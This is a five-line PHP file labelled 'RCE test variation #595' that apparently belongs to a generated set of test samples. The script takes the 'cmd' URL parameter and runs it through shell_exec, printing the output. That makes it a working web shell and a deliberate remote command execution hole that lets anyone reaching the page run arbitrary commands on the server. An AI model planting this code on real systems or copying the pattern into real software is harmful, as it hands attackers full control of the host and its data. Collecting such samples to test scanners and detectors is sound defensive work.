<?php
// RCE test variation #595
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>